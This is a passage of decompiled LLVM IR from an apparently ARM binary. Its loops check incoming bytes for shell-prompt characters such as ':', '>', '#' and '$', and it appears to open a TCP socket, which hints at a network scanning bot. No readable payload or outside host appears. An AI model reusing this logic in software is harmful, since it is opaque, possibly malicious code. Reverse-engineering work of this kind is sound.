  %v1_1021c = call i32 @function_10b68(i32 25)
  store i32 %v1_1021c, i32* %r0.global-to-local, align 4
  %v0_10220.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10220

dec_label_pc_10220:                               ; preds = %dec_label_pc_10884, %dec_label_pc_10218
  %v0_10220 = phi i32 [ %v0_1088c, %dec_label_pc_10884 ], [ %v0_10220.pre, %dec_label_pc_10218 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10220 = icmp eq i32 %v0_10220, 0
  store i1 %v2_10220, i1* %cpsr_z.global-to-local, align 1
  %tmp371 = icmp slt i32 %v0_10220, 1
  br i1 %tmp371, label %dec_label_pc_10114, label %dec_label_pc_10228

dec_label_pc_10228:                               ; preds = %dec_label_pc_10220
  %v0_10228 = load i32, i32* @r6, align 4
  %v1_10228 = inttoptr i32 %v0_10228 to i32*
  %v2_10228 = load i32, i32* %v1_10228, align 4
  store i32 %v2_10228, i32* %r3.global-to-local, align 4
  %v1_1022c = add i32 %v0_10228, 4
  %v2_1022c = inttoptr i32 %v1_1022c to i32*
  %v3_1022c = load i32, i32* %v2_1022c, align 4
  store i32 %v3_1022c, i32* %r0.global-to-local, align 4
  %v1_10230 = add i32 %v2_10228, 13
  %v2_10230 = inttoptr i32 %v1_10230 to i8*
  %v3_10230 = load i8, i8* %v2_10230, align 1
  %v4_10230 = zext i8 %v3_10230 to i32
  store i32 %v4_10230, i32* %r2.global-to-local, align 4
  %v1_10234 = add i32 %v2_10228, 4
  %v2_10234 = inttoptr i32 %v1_10234 to i32*
  %v3_10234 = load i32, i32* %v2_10234, align 4
  store i32 %v3_10234, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1023c = inttoptr i32 %v3_10234 to i32*
  %v5_1023c = call i32 @function_12350(i32 %v3_1022c, i32* %v4_1023c, i32 %v4_10230, i32 16384)
  store i32 %v5_1023c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_10244 = load i32, i32* @r6, align 4
  %v1_10244 = add i32 %v0_10244, 4
  %v2_10244 = inttoptr i32 %v1_10244 to i32*
  %v3_10244 = load i32, i32* %v2_10244, align 4
  store i32 %v3_10244, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_10250 = call i32 @function_12350(i32 %v3_10244, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 %v5_10250, i32* %r0.global-to-local, align 4
  %v0_10254 = load i32, i32* @r6, align 4
  %v1_10254 = add i32 %v0_10254, 24
  %v2_10254 = inttoptr i32 %v1_10254 to i32*
  %v3_10254 = load i32, i32* %v2_10254, align 4
  store i32 %v3_10254, i32* %ip.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_1025c = add i32 %v0_10254, 12
  %v3_1025c = inttoptr i32 %v2_1025c to i32*
  store i32 5, i32* %v3_1025c, align 4
  br label %dec_label_pc_105a4

dec_label_pc_10264:                               ; preds = %dec_label_pc_10004
  %v1_10264 = add i32 %v0_10004, 24
  %v2_10264 = inttoptr i32 %v1_10264 to i32*
  %v3_10264 = load i32, i32* %v2_10264, align 4
  store i32 %v3_10264, i32* %ip.global-to-local, align 4
  %v1_10268 = add i32 %v3_10264, -1
  store i32 %v1_10268, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1026c = icmp eq i32 %v1_10268, 0
  store i1 %v2_1026c, i1* %cpsr_z.global-to-local, align 1
  %v5_10270 = icmp sgt i32 %v1_10268, 0
  br i1 %v5_10270, label %dec_label_pc_10298, label %dec_label_pc_ff84.backedge.thread

dec_label_pc_10278:                               ; preds = %bb372
  %v2_10278 = icmp ugt i8 %v3_1029c, 35
  store i1 %v2_10278, i1* %cpsr_c.global-to-local, align 1
  %v7_10278 = icmp eq i8 %v3_1029c, 36
  store i1 %v7_10278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10278, label %dec_label_pc_102ac, label %dec_label_pc_10280

dec_label_pc_10280:                               ; preds = %dec_label_pc_10278
  %v2_10280 = icmp ugt i8 %v3_1029c, 34
  store i1 %v2_10280, i1* %cpsr_c.global-to-local, align 1
  %v7_10280 = icmp eq i8 %v3_1029c, 35
  store i1 %v7_10280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10280, label %dec_label_pc_102ac, label %dec_label_pc_10288

dec_label_pc_10288:                               ; preds = %dec_label_pc_10280
  %v2_10288 = icmp ugt i8 %v3_1029c, 36
  store i1 %v2_10288, i1* %cpsr_c.global-to-local, align 1
  %v7_10288 = icmp eq i8 %v3_1029c, 37
  store i1 %v7_10288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10288, label %dec_label_pc_102ac, label %dec_label_pc_10290

dec_label_pc_10290:                               ; preds = %dec_label_pc_10288
  %v1_10290 = add i32 %v0_102ac, -1
  store i32 %v1_10290, i32* %r0.global-to-local, align 4
  %v2_10290 = icmp ne i32 %v0_102ac, 0
  store i1 %v2_10290, i1* %cpsr_c.global-to-local, align 1
  %v7_10290 = icmp eq i32 %v0_102ac, 1
  store i1 %v7_10290, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10290, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_10298

dec_label_pc_10298:                               ; preds = %dec_label_pc_10264, %dec_label_pc_10290
  %v0_102ac = phi i32 [ %v1_10290, %dec_label_pc_10290 ], [ %v1_10268, %dec_label_pc_10264 ]
  %v2_10298 = add i32 %v0_102ac, %v0_10004
  store i32 %v2_10298, i32* %r3.global-to-local, align 4
  %v1_1029c = add i32 %v2_10298, 28
  %v2_1029c = inttoptr i32 %v1_1029c to i8*
  %v3_1029c = load i8, i8* %v2_1029c, align 1
  %v4_1029c = zext i8 %v3_1029c to i32
  store i32 %v4_1029c, i32* %r3.global-to-local, align 4
  %v2_102a0 = icmp ugt i8 %v3_1029c, 61
  store i1 %v2_102a0, i1* %cpsr_c.global-to-local, align 1
  %v7_102a0 = icmp eq i8 %v3_1029c, 62
  store i1 %v7_102a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102a0, label %dec_label_pc_102ac, label %bb372

bb372:                                            ; preds = %dec_label_pc_10298
  %v3_102a4 = icmp ugt i8 %v3_1029c, 57
  store i1 %v3_102a4, i1* %cpsr_c.global-to-local, align 1
  %v8_102a4 = icmp eq i8 %v3_1029c, 58
  store i1 %v8_102a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_102a4, label %dec_label_pc_102ac, label %dec_label_pc_10278

dec_label_pc_102ac:                               ; preds = %dec_label_pc_10298, %bb372, %dec_label_pc_10288, %dec_label_pc_10280, %dec_label_pc_10278
  %v1_102ac = add i32 %v0_102ac, 1
  store i32 %v1_102ac, i32* @r7, align 4
  %v2_102b0 = icmp eq i32 %v1_102ac, -1
  store i1 %v2_102b0, i1* %cpsr_c.global-to-local, align 1
  %v7_102b0 = icmp eq i32 %v0_102ac, -2
  store i1 %v7_102b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_102b0, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_102b8

dec_label_pc_102b8:                               ; preds = %dec_label_pc_102ac
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_102b8 = icmp eq i32 %v1_102ac, 0
  store i1 %v2_102b8, i1* %cpsr_z.global-to-local, align 1
  %tmp373 = icmp slt i32 %v1_102ac, 1
  br i1 %tmp373, label %dec_label_pc_10114, label %dec_label_pc_102c0

dec_label_pc_102c0:                               ; preds = %dec_label_pc_102b8
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_102c4 = call i32 @function_10c20(i32 5)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v3_102d4 = call i32 @function_10b3c(i32 5, i32* nonnull %stack_var_-56)
  store i32 %v3_102d4, i32* %r0.global-to-local, align 4
  %v3_102d8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_102d8, i32* %r2.global-to-local, align 4
  store i32 %v3_102d4, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_102e4 = load i32, i32* @r6, align 4
  %v1_102e4 = add i32 %v0_102e4, 4
  %v2_102e4 = inttoptr i32 %v1_102e4 to i32*
  %v3_102e4 = load i32, i32* %v2_102e4, align 4
  store i32 %v3_102e4, i32* %r0.global-to-local, align 4
  %v4_102e8 = inttoptr i32 %v3_102d4 to i32*
  %v5_102e8 = call i32 @function_12350(i32 %v3_102e4, i32* %v4_102e8, i32 %v3_102d8, i32 16384)
  store i32 %v5_102e8, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_102f8 = load i32, i32* @r6, align 4
  %v1_102f8 = add i32 %v0_102f8, 4
  %v2_102f8 = inttoptr i32 %v1_102f8 to i32*
  %v3_102f8 = load i32, i32* %v2_102f8, align 4
  store i32 %v3_102f8, i32* %r0.global-to-local, align 4
  %v5_102fc = call i32 @function_12350(i32 %v3_102f8, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10304 = call i32 @function_10b68(i32 5)
  store i32 %v1_10304, i32* %r0.global-to-local, align 4
  %v0_10308 = load i32, i32* @r6, align 4
  %v1_10308 = add i32 %v0_10308, 24
  %v2_10308 = inttoptr i32 %v1_10308 to i32*
  %v3_10308 = load i32, i32* %v2_10308, align 4
  store i32 %v3_10308, i32* %ip.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v2_10310 = add i32 %v0_10308, 12
  %v3_10310 = inttoptr i32 %v2_10310 to i32*
  store i32 6, i32* %v3_10310, align 4
  br label %dec_label_pc_105a4

dec_label_pc_10318:                               ; preds = %dec_label_pc_10004
  %v1_10318 = add i32 %v0_10004, 24
  %v2_10318 = inttoptr i32 %v1_10318 to i32*
  %v3_10318 = load i32, i32* %v2_10318, align 4
  store i32 %v3_10318, i32* %ip.global-to-local, align 4
  %v1_1031c = add i32 %v3_10318, -1
  store i32 %v1_1031c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10320 = icmp eq i32 %v1_1031c, 0
  store i1 %v2_10320, i1* %cpsr_z.global-to-local, align 1
  %v5_10324 = icmp sgt i32 %v1_1031c, 0
  br i1 %v5_10324, label %dec_label_pc_103c4, label %dec_label_pc_ff84.backedge.thread

dec_label_pc_103a4:                               ; preds = %bb374
  %v2_103a4 = icmp ugt i8 %v3_103c8, 35
  store i1 %v2_103a4, i1* %cpsr_c.global-to-local, align 1
  %v7_103a4 = icmp eq i8 %v3_103c8, 36
  store i1 %v7_103a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103a4, label %dec_label_pc_103d8, label %dec_label_pc_103ac

dec_label_pc_103ac:                               ; preds = %dec_label_pc_103a4
  %v2_103ac = icmp ugt i8 %v3_103c8, 34
  store i1 %v2_103ac, i1* %cpsr_c.global-to-local, align 1
  %v7_103ac = icmp eq i8 %v3_103c8, 35
  store i1 %v7_103ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103ac, label %dec_label_pc_103d8, label %dec_label_pc_103b4

dec_label_pc_103b4:                               ; preds = %dec_label_pc_103ac
  %v2_103b4 = icmp ugt i8 %v3_103c8, 36
  store i1 %v2_103b4, i1* %cpsr_c.global-to-local, align 1
  %v7_103b4 = icmp eq i8 %v3_103c8, 37
  store i1 %v7_103b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103b4, label %dec_label_pc_103d8, label %dec_label_pc_103bc

dec_label_pc_103bc:                               ; preds = %dec_label_pc_103b4
  %v1_103bc = add i32 %v0_103d8, -1
  store i32 %v1_103bc, i32* %r0.global-to-local, align 4
  %v2_103bc = icmp ne i32 %v0_103d8, 0
  store i1 %v2_103bc, i1* %cpsr_c.global-to-local, align 1
  %v7_103bc = icmp eq i32 %v0_103d8, 1
  store i1 %v7_103bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103bc, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_103c4

dec_label_pc_103c4:                               ; preds = %dec_label_pc_10318, %dec_label_pc_103bc
  %v0_103d8 = phi i32 [ %v1_103bc, %dec_label_pc_103bc ], [ %v1_1031c, %dec_label_pc_10318 ]
  %v2_103c4 = add i32 %v0_103d8, %v0_10004
  store i32 %v2_103c4, i32* %r3.global-to-local, align 4
  %v1_103c8 = add i32 %v2_103c4, 28
  %v2_103c8 = inttoptr i32 %v1_103c8 to i8*
  %v3_103c8 = load i8, i8* %v2_103c8, align 1
  %v4_103c8 = zext i8 %v3_103c8 to i32
  store i32 %v4_103c8, i32* %r3.global-to-local, align 4
  %v2_103cc = icmp ugt i8 %v3_103c8, 61
  store i1 %v2_103cc, i1* %cpsr_c.global-to-local, align 1
  %v7_103cc = icmp eq i8 %v3_103c8, 62
  store i1 %v7_103cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103cc, label %dec_label_pc_103d8, label %bb374

bb374:                                            ; preds = %dec_label_pc_103c4
  %v3_103d0 = icmp ugt i8 %v3_103c8, 57
  store i1 %v3_103d0, i1* %cpsr_c.global-to-local, align 1
  %v8_103d0 = icmp eq i8 %v3_103c8, 58
  store i1 %v8_103d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_103d0, label %dec_label_pc_103d8, label %dec_label_pc_103a4

dec_label_pc_103d8:                               ; preds = %dec_label_pc_103c4, %bb374, %dec_label_pc_103b4, %dec_label_pc_103ac, %dec_label_pc_103a4
  %v1_103d8 = add i32 %v0_103d8, 1
  store i32 %v1_103d8, i32* @r7, align 4
  %v2_103dc = icmp eq i32 %v1_103d8, -1
  store i1 %v2_103dc, i1* %cpsr_c.global-to-local, align 1
  %v7_103dc = icmp eq i32 %v0_103d8, -2
  store i1 %v7_103dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103dc, label %dec_label_pc_ff84.backedge.thread500, label %dec_label_pc_103e4

dec_label_pc_103e4:                               ; preds = %dec_label_pc_103d8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_103e4 = icmp eq i32 %v1_103d8, 0
  store i1 %v2_103e4, i1* %cpsr_z.global-to-local, align 1
  %tmp375 = icmp slt i32 %v1_103d8, 1
  br i1 %tmp375, label %dec_label_pc_10114, label %dec_label_pc_103ec

dec_label_pc_103ec:                               ; preds = %dec_label_pc_103e4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_103f0 = call i32 @function_10c20(i32 6)
  store i32 %v2_103f8, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_10400 = call i32 @function_10b3c(i32 6, i32* nonnull %stack_var_-48)
  store i32 %v3_10400, i32* %r0.global-to-local, align 4
  %v3_10404 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_10404, i32* %r2.global-to-local, align 4
  store i32 %v3_10400, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10410 = load i32, i32* @r6, align 4
  %v1_10410 = add i32 %v0_10410, 4
  %v2_10410 = inttoptr i32 %v1_10410 to i32*
  %v3_10410 = load i32, i32* %v2_10410, align 4
  store i32 %v3_10410, i32* %r0.global-to-local, align 4
  %v4_10414 = inttoptr i32 %v3_10400 to i32*
  %v5_10414 = call i32 @function_12350(i32 %v3_10410, i32* %v4_10414, i32 %v3_10404, i32 16384)
  store i32 %v5_10414, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1441c.205 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10424 = load i32, i32* @r6, align 4
  %v1_10424 = add i32 %v0_10424, 4
  %v2_10424 = inttoptr i32 %v1_10424 to i32*
  %v3_10424 = load i32, i32* %v2_10424, align 4
  store i32 %v3_10424, i32* %r0.global-to-local, align 4
  %v5_10428 = call i32 @function_12350(i32 %v3_10424, i32* bitcast ([3 x i8]* @global_var_1441c.205 to i32*), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_10430 = call i32 @function_10b68(i32 6)
  store i32 %v1_10430, i32* %r0.global-to-local, align 4
  %v0_10434 = load i32, i32* @r6, align 4
  %v1_10434 = add i32 %v0_10434, 24
  %v2_10434 = inttoptr i32 %v1_10434 to i32*
  %v3_10434 = load i32, i32* %v2_10434, align 4
  store i32 %v3_10434, i32* %ip.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v2_1043c = add i32 %v0_10434, 12
  %v3_1043c = inttoptr i32 %v2_1043c to i32*
  store i32 7, i32* %v3_1043c, align 4
  br label %dec_label_pc_105a4

dec_label_pc_10444:                               ; preds = %dec_label_pc_10004
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10448 = call i32 @function_10c20(i32 10)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_10458 = call i32 @function_10b3c(i32 10, i32* nonnull %stack_var_-56)
  %v3_1045c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10458, i32* %r2.global-to-local, align 4
  %v1_10464 = add i32 %v3_1045c, -1
  store i32 %v1_10464, i32* %r3.global-to-local, align 4
  %v0_10468 = load i32, i32* @sb, align 4
  store i32 %v0_10468, i32* %r0.global-to-local, align 4
  %v0_1046c = load i32, i32* @r6, align 4
  %v1_1046c = add i32 %v0_1046c, 24
  %v2_1046c = inttoptr i32 %v1_1046c to i32*
  %v3_1046c = load i32, i32* %v2_1046c, align 4
  store i32 %v3_1046c, i32* %r1.global-to-local, align 4
  %v4_10470 = call i32 @function_112b0(i32 %v0_10468, i32 %v3_1046c, i32 %v3_10458, i32 %v1_10464)
  %v3_10474 = icmp eq i32 %v4_10470, -1
  store i1 %v3_10474, i1* %cpsr_c.global-to-local, align 1
  %v8_10474 = icmp eq i32 %v4_10470, -1
  store i1 %v8_10474, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10480 = call i32 @function_10b68(i32 10)
  br i1 %v3_10474, label %dec_label_pc_1047c, label %dec_label_pc_10898

dec_label_pc_1047c:                               ; preds = %dec_label_pc_10444
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_10488 = call i32 @function_10c20(i32 9)
  store i32 %v2_fef4, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_10498 = call i32 @function_10b3c(i32 9, i32* nonnull %stack_var_-56)
  store i32 %v3_10498, i32* %r0.global-to-local, align 4
  %v3_1049c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10498, i32* %r2.global-to-local, align 4
  %v1_104a4 = add i32 %v3_1049c, -1
  store i32 %v1_104a4, i32* %r3.global-to-local, align 4
  %v0_104a8 = load i32, i32* @r6, align 4
  %v1_104a8 = add i32 %v0_104a8, 24
  %v2_104a8 = inttoptr i32 %v1_104a8 to i32*
  %v3_104a8 = load i32, i32* %v2_104a8, align 4
  store i32 %v3_104a8, i32* %r1.global-to-local, align 4
  %v0_104ac = load i32, i32* @sb, align 4
  store i32 %v0_104ac, i32* %r0.global-to-local, align 4
  %v4_104b0 = call i32 @function_112b0(i32 %v0_104ac, i32 %v3_104a8, i32 %v3_10498, i32 %v1_104a4)
  store i32 %v4_104b0, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_104bc = call i32 @function_10b68(i32 9)
  store i32 %v1_104bc, i32* %r0.global-to-local, align 4
  %v0_104c0 = load i32, i32* @r7, align 4
  %v2_104c0 = icmp eq i32 %v0_104c0, -1
  store i1 %v2_104c0, i1* %cpsr_c.global-to-local, align 1
  %v7_104c0 = icmp eq i32 %v0_104c0, -1
  store i1 %v7_104c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_104c0, label %dec_label_pc_ff80.loopexit, label %dec_label_pc_104c8

dec_label_pc_104c8:                               ; preds = %dec_label_pc_1047c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_104c8 = icmp eq i32 %v0_104c0, 0
  store i1 %v2_104c8, i1* %cpsr_z.global-to-local, align 1
  %tmp376 = icmp slt i32 %v0_104c0, 1
  br i1 %tmp376, label %dec_label_pc_10114, label %dec_label_pc_104d0

dec_label_pc_104d0:                               ; preds = %dec_label_pc_104c8
  %v0_104d0 = load i32, i32* @r6, align 4
  %v1_104d0 = add i32 %v0_104d0, 21
  %v2_104d0 = inttoptr i32 %v1_104d0 to i8*
  %v3_104d0 = load i8, i8* %v2_104d0, align 1
  %v4_104d0 = zext i8 %v3_104d0 to i32
  store i32 %v4_104d0, i32* %r3.global-to-local, align 4
  %v1_104d4 = add i32 %v0_104d0, 20
  %v2_104d4 = inttoptr i32 %v1_104d4 to i8*
  %v3_104d4 = load i8, i8* %v2_104d4, align 1
  %v4_104d4 = zext i8 %v3_104d4 to i32
  store i32 %v4_104d4, i32* %r2.global-to-local, align 4
  %v1_104d8 = add i32 %v0_104d0, 16
  %v2_104d8 = inttoptr i32 %v1_104d8 to i32*
  %v3_104d8 = load i32, i32* %v2_104d8, align 4
  store i32 %v3_104d8, i32* %r1.global-to-local, align 4
  %v4_104dc = mul nuw nsw i32 %v4_104d0, 256
  %v5_104dc = or i32 %v4_104d4, %v4_104dc
  store i32 %v5_104dc, i32* %r2.global-to-local, align 4
  %v1_104e0 = and i32 %v4_104d4, 128
  %v2_104e0 = icmp ne i32 %v1_104e0, 0
  store i1 %v2_104e0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_104d0, i32* %r3.global-to-local, align 4
  store i32 %v3_104d8, i32* %stack_var_-48, align 4
  store i32 %v5_104dc, i32* %stack_var_-38, align 4
  %v1_104f0 = inttoptr i32 %v0_104d0 to i32*
  %v2_104f0 = load i32, i32* %v1_104f0, align 4
  store i32 %v2_104f0, i32* @fp, align 4
  %v0_104f4 = call i32 @function_11b1c()
  store i32 %v0_104f4, i32* %r0.global-to-local, align 4
  %v7_104f8 = icmp eq i32 %v0_104f4, -1
  %.398 = zext i1 %v7_104f8 to i32
  store i32 %.398, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10504 = icmp eq i32 %v0_104f4, 0
  store i1 %v2_10504, i1* %cpsr_z.global-to-local, align 1
  %tmp379 = icmp slt i32 %v0_104f4, 1
  br i1 %tmp379, label %bb380, label %.thread89

.thread89:                                        ; preds = %dec_label_pc_104d0
  store i32 1, i32* %sl.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10588

bb380:                                            ; preds = %dec_label_pc_104d0
  store i32 %.398, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10510 = icmp eq i1 %v7_104f8, false
  store i1 %v2_10510, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10510, label %dec_label_pc_10518, label %dec_label_pc_10588

dec_label_pc_10518:                               ; preds = %bb380
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_10524 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  store i32 %v3_10524, i32* %r0.global-to-local, align 4
  %v2_10528 = icmp eq i32 %v3_10524, -1
  store i1 %v2_10528, i1* %cpsr_c.global-to-local, align 1
  %v7_10528 = icmp eq i32 %v3_10524, -1
  store i1 %v7_10528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10524, i32* @r5, align 4
  br i1 %v7_10528, label %dec_label_pc_10b24, label %dec_label_pc_10534

dec_label_pc_10534:                               ; preds = %dec_label_pc_10518
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10538 = call i32 @function_10c20(i32 2)
  store i32 ptrtoint ([22 x i8]* @global_var_14368.79 to i32), i32* %r0.global-to-local, align 4
  %v3_10540 = call i32 @function_ec00(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @global_var_14368.79, i32 0, i32 0))
  store i32 %v3_10540, i32* %r0.global-to-local, align 4
  store i32 %v3_10540, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_10544 = icmp eq i32 %v3_10540, 0
  store i1 %v3_10544, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10544, label %dec_label_pc_1054c, label %dec_label_pc_109fc

dec_label_pc_1054c:                               ; preds = %dec_label_pc_10534
  store i32 2, i32* @r4, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_14380.83 to i32), i32* @r0, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v2_1055c = call i32 @function_121ec(i32 ptrtoint ([15 x i8]* @global_var_14380.83 to i32))
  %v0_10560 = load i32, i32* @r8, align 4
  store i32 %v0_10560, i32* %r1.global-to-local, align 4
  %v0_10568 = load i32, i32* @r4, align 4
  store i32 %v0_10568, i32* %r0.global-to-local, align 4
  %v2_1056c = inttoptr i32 %v0_10560 to i32*
  %v3_1056c = call i32 @function_10b3c(i32 %v0_10568, i32* %v2_1056c)
  %v4_1056c = inttoptr i32 %v3_1056c to i8*
  store i32 %v3_1056c, i32* %r0.global-to-local, align 4
  %v2_10570 = add i32 %v3_1056c, 1
  %v3_10570 = inttoptr i32 %v2_10570 to i8*
  %v4_10570 = load i8, i8* %v3_10570, align 1
  %v5_10570 = zext i8 %v4_10570 to i32
  store i32 %v5_10570, i32* %r1.global-to-local, align 4
  %v3_10574 = load i8, i8* %v4_1056c, align 1
  %v4_10574 = zext i8 %v3_10574 to i32
  %v4_10578 = mul nuw nsw i32 %v5_10570, 256
  %v5_10578 = or i32 %v4_10574, %v4_10578
  store i32 %v5_10578, i32* %r3.global-to-local, align 4
  %v1_1057c = and i32 %v4_10574, 128
  %v2_1057c = icmp ne i32 %v1_1057c, 0
  store i1 %v2_1057c, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_10570, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10588

dec_label_pc_10588:                               ; preds = %.thread89, %bb380, %dec_label_pc_1054c
  %v0_10588 = load i32, i32* @r6, align 4
  %v1_10588 = add i32 %v0_10588, 4
  %v2_10588 = inttoptr i32 %v1_10588 to i32*
  %v3_10588 = load i32, i32* %v2_10588, align 4
  store i32 %v3_10588, i32* %r0.global-to-local, align 4
  %v1_1058c = call i32 @function_11af0(i32 %v3_10588)
  store i32 %v1_1058c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_10598 = load i32, i32* @r6, align 4
  %v1_10598 = add i32 %v0_10598, 24
  %v2_10598 = inttoptr i32 %v1_10598 to i32*
  %v3_10598 = load i32, i32* %v2_10598, align 4
  store i32 %v3_10598, i32* %ip.global-to-local, align 4
  %v2_1059c = add i32 %v0_10598, 4
  %v3_1059c = inttoptr i32 %v2_1059c to i32*
  store i32 -1, i32* %v3_1059c, align 4
  %v0_105a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_105a0 = load i32, i32* @r6, align 4
  %v2_105a0 = add i32 %v1_105a0, 12
  %v3_105a0 = inttoptr i32 %v2_105a0 to i32*
  store i32 %v0_105a0, i32* %v3_105a0, align 4
  br label %dec_label_pc_105a4

dec_label_pc_105a4:                               ; preds = %.thread238, %dec_label_pc_1078c, %dec_label_pc_106d8, %dec_label_pc_10624, %dec_label_pc_1098c, %dec_label_pc_108c8, %dec_label_pc_103ec, %dec_label_pc_102c0, %dec_label_pc_10228, %dec_label_pc_10190, %dec_label_pc_1011c, %dec_label_pc_10588
  %v0_105a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_105a4 = load i32, i32* @r7, align 4
  %v2_105a4 = sub i32 %v0_105a4, %v1_105a4
  %v3_105a4 = icmp uge i32 %v0_105a4, %v1_105a4
  store i1 %v3_105a4, i1* %cpsr_c.global-to-local, align 1
  %v4_105a4 = xor i32 %v1_105a4, %v0_105a4
  %v5_105a4 = xor i32 %v2_105a4, %v0_105a4
  %v6_105a4 = and i32 %v5_105a4, %v4_105a4
  %v7_105a4 = icmp slt i32 %v6_105a4, 0
  %v8_105a4 = icmp slt i32 %v2_105a4, 0
  %v9_105a4 = icmp eq i32 %v0_105a4, %v1_105a4
  store i1 %v9_105a4, i1* %cpsr_z.global-to-local, align 1
  %v2_105a8 = xor i1 %v8_105a4, %v7_105a4
  %v0_105a4.v1_105a4 = select i1 %v2_105a8, i32 %v0_105a4, i32 %v1_105a4
  store i32 %v0_105a4.v1_105a4, i32* %r1.global-to-local, align 4
  %v2_105b0 = sub i32 %v0_105a4, %v0_105a4.v1_105a4
  store i32 %v2_105b0, i32* @r2, align 4
  %v1_105b4 = load i32, i32* @r6, align 4
  %v2_105b4 = add i32 %v1_105b4, 24
  %v3_105b4 = inttoptr i32 %v2_105b4 to i32*
  store i32 %v2_105b0, i32* %v3_105b4, align 4
  %v0_105b8 = load i32, i32* @sb, align 4
  %v1_105b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_105b8 = add i32 %v1_105b8, %v0_105b8
  store i32 %v2_105b8, i32* @r1, align 4
  store i32 %v0_105b8, i32* @r0, align 4
